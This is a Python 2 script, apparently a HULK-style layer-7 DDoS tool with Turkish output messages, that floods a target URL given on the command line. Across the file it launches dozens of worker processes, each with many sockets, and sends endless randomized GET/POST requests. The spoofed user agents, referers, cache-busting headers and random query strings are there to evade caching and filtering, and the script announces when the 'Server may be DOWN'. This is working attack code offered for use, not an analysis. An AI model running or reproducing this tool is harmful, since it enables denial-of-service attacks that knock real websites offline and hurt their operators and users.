#!/usr/bin/env python
from multiprocessing import Process, Manager
import urlparse, ssl
import sys, getopt, random, time

if  sys.version_info < (3,0):
    import httplib
    HTTPCLIENT = httplib
else:
    import http.client
    HTTPCLIENT = http.client

DEBUG = True

METHOD_GET  = "get"
METHOD_POST = "post"
METHOD_RAND = "random"

JOIN_TIMEOUT=1.5

DEFAULT_WORKERS=55
DEFAULT_SOCKETS=35


class R00T(object):

    counter = [0, 0]
    last_counter = [0, 0]

    workersQueue = []
    manager = None

    url = None

    nr_workers = DEFAULT_WORKERS
    nr_sockets = DEFAULT_SOCKETS
    method = METHOD_RAND

    def __init__(self, url):

        self.url = url

        self.manager = Manager()

        self.counter = self.manager.list((0, 0))

    def exit(self):
        self.stats()
        print "DOWN!!!"

    def __del__(self):
        self.exit()

    def printHeader(self):

        print "DDoS SaLdirisi BasLatiLdi.."
        print "CoDeD By nigga"
    def fire(self):

        self.printHeader()
        print "Method: {0} / Sayisi: {1} / Socked: {2}".format(self.method, self.nr_workers, self.nr_sockets)

        if DEBUG:
            print "Debug Modes ON Method: {0} ".format(self.nr_workers)

        for i in range(int(self.nr_workers)):

            try:

                worker = Laser(self.url, self.nr_sockets, self.counter)
                worker.method = self.method

                self.workersQueue.append(worker)
                worker.start()
            except (Exception):
                error("Sayi Baslatilamadi {0}".format(i))
                pass 

        print "Monitor is initializing"
        self.monitor()

    def stats(self):

        try:
            if self.counter[0] > 0 or self.counter[1] > 0:

                print "Yedigi Pakets: {0} DDoSeD ({1} GG)".format(self.counter[0], self.counter[1])

                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "Server may be DOWN! By dev-sokin.xyz"
    
                self.last_counter[0] = self.counter[0]
                self.last_counter[1] = self.counter[1]
        except (Exception):
            pass 

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)

                self.stats()

            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all workers"
                for worker in self.workersQueue:
                    try:
                        if DEBUG:
                            print "Killing worker {0}".format(worker.name)
                        worker.stop()
                    except Exception, ex:
                        pass 
                if DEBUG:
                    raise
                else:
                    pass


class Laser(Process):

        
    request_count = 0
    failed_count = 0

    url = None
    host = None
    port = 80
    ssl = False
    referers = []
    useragents = []
    socks = []
    counter = None
    nr_socks = DEFAULT_SOCKETS

    runnable = True

    method = METHOD_GET

    def __init__(self, url, nr_sockets, counter):

        super(Laser, self).__init__()

        self.counter = counter
        self.nr_socks = nr_sockets

        parsedUrl = urlparse.urlparse(url)

        if parsedUrl.scheme == "https":
            self.ssl = True

        self.host = parsedUrl.netloc.split("\x3A")[0]
        self.url = parsedUrl.path

        self.port = parsedUrl.port

        if not self.port:
            self.port = 80 if not self.ssl else 443


        self.referers = [ 
            "http://www.google.com/?q=",
            "http://www.usatoday.com/search/results?q=",
            "http://engadget.search.aol.com/search?q=",
            "http://vk.com/profile.php?redirect=",
            "http://yandex.ru/yandsearch?text=",
            "https://duckduckgo.com/?q=",
            "http://www.bing.com/search?q=",
            "http://help.baidu.com/searchResult?keywords=",
            "http://www.ask.com/web?q=",
            "http://www.reddit.com/search?q=",
            "http://www.google.com.tr/?q=",
            "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
            "http://" + self.host + "/"
            ]


        self.useragents = [
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
            "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
            "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.1)",
            "Java/1.4.1_04",
            "Opera/8.51 (Windows NT 5.1; U; en;VWP-online.de)",
            "Wget/1.9.1",
            "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
            "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
            "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 OPR/60.0.3255.69",
            "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/31.51",
            "Lynx/2.8.8dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/2.12.14",
            ]

    def __del__(self):
        self.stop()


    def buildblock(self, size):
        out_str = ""

        _LOWERCASE = range(97, 122)
        _UPPERCASE = range(65, 90)
        _NUMERIC   = range(48, 57)

        validChars = _LOWERCASE + _UPPERCASE + _NUMERIC

        for i in range(0, size):
            a = random.choice(validChars)
            out_str += chr(a)

        return out_str


    def run(self):

        if DEBUG:
            print "Sockets are Acting ...".format(self.name)

        while self.runnable:

            try:

                for i in range(self.nr_socks):
                
                    if self.ssl:
                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)

                    self.socks.append(c)

                for conn_req in self.socks:

                    (url, headers) = self.createPayload()

                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method

                    conn_req.request(method.upper(), url, None, headers)

                for conn_resp in self.socks:

                    resp = conn_resp.getresponse()
                    self.incCounter()

                self.closeConnections()
                
            except:
                self.incFailed()
                if DEBUG:
                    raise
                else:
                    pass 

        if DEBUG:
            print "Worker {0} completed run. Sleeping...".format(self.name)
            
    def closeConnections(self):
        for conn in self.socks:
            try:
                conn.close()
            except:
                pass 
            

    def createPayload(self):

        req_url, headers = self.generateData()

        random_keys = headers.keys()
        random.shuffle(random_keys)
        random_headers = {}
        
        for header_name in random_keys:
            random_headers[header_name] = headers[header_name]

        return (req_url, random_headers)

    def generateQueryString(self, ammount = 1):

        queryString = []

        for i in range(ammount):

            key = self.buildblock(random.randint(3,10))
            value = self.buildblock(random.randint(3,20))
            element = "{0}={1}".format(key, value)
            queryString.append(element)

        return "&".join(queryString)
            
    
    def generateData(self):

        returnCode = 0
        param_joiner = "?"

        if len(self.url) == 0:
            self.url = "/"

        if self.url.count("?") > 0:
            param_joiner = "&"

        request_url = self.generateRequestUrl(param_joiner)

        http_headers = self.generateRandomHeaders()


        return (request_url, http_headers)

    def generateRequestUrl(self, param_joiner = "\x3F"):

        return self.url + param_joiner + self.generateQueryString(random.randint(1,5))

    def generateRandomHeaders(self):

        noCacheDirectives = ["no-cache", "must-revalidate"]
        random.shuffle(noCacheDirectives)
        noCache = ", ".join(noCacheDirectives)

        acceptEncoding = ["''","*","identity","gzip","deflate"]
        random.shuffle(acceptEncoding)
        nrEncodings = random.randint(0,len(acceptEncoding)/2)
        roundEncodings = acceptEncoding[:nrEncodings]

        http_headers = {
            "User-Agent": random.choice(self.useragents),
            "Cache-Control": noCache,
            "Accept-Encoding": ", ".join(roundEncodings),
            "Connection": "keep-alive",
            "Keep-Alive": random.randint(110,120),
            "Host": self.host,
        }
    
        if random.randrange(2) == 0:
            acceptCharset = [ "ISO-8859-1", "utf-8", "Windows-1251", "ISO-8859-2", "ISO-8859-15", ]
            random.shuffle(acceptCharset)
            http_headers["Accept-Charset"] = "{0},{1};q={2},*;q={3}".format(acceptCharset[0], acceptCharset[1],round(random.random(), 1), round(random.random(), 1))

        if random.randrange(2) == 0:
            http_headers["Referer"] = random.choice(self.referers) + self.buildblock(random.randint(5,10))

        if random.randrange(2) == 0:
            http_headers["Content-Type"] = random.choice(["multipart/form-data", "application/x-url-encoded"])

        if random.randrange(2) == 0:
            http_headers["Cookie"] = self.generateQueryString(random.randint(1, 5))

        return http_headers

    def stop(self):
        self.runnable = False
        self.closeConnections()
        self.terminate()

    def incCounter(self):
        try:
            self.counter[0] += 1
        except (Exception):
            pass

    def incFailed(self):
        try:
            self.counter[1] += 1
        except (Exception):
            pass
        




def usage():
    print
    print ""
    print "Layer7 OVH"
    print
    print ""


    
def error(msg):
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)


def main():
    
    try:

        if len(sys.argv) < 2:
            error("Hedef Belirtiniz = python l7_ovh.py http://targetsite.com")

        url = sys.argv[1]

        if url == "-h":
            usage()
            sys.exit()

        if url[0:4].lower() != "http":
            error("Hedef Urlde Hata Var - 1")

        if url == None:
            error("Hedef Urlde Hata Var - 2")

        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:", ["debug", "\x68\x65\x6C\x70", "\x77\x6F\x72\x6B\x65\x72\x73", "\x73\x6F\x63\x6B\x65\x74\x73", "\x6D\x65\x74\x68\x6F\x64" ])

        workers = DEFAULT_WORKERS
        socks = DEFAULT_SOCKETS
        method = METHOD_GET

        for o, a in opts:
            if o in ("-hh", "--help"):
                usage()
                sys.exit()
            elif o in ("-ss", "--socket"):
                socks = int(a)
            elif o in ("-ww", "--worker"):
                workers = int(a)
            elif o in ("-dd", "--debuged"):
                global DEBUG
                DEBUG = True
            elif o in ("-mm", "--methods"):
                if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                    method = a
                else:
                    error("method {0} is invalid".format(a))
            else:
                error("option '"+o+"' doesn't exists")

        r000t = R00T(url)
        r000t.nr_workers = workers
        r000t.method = method
        r000t.nr_sockets = socks

        r000t.fire()

    except getopt.GetoptError, err:

        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()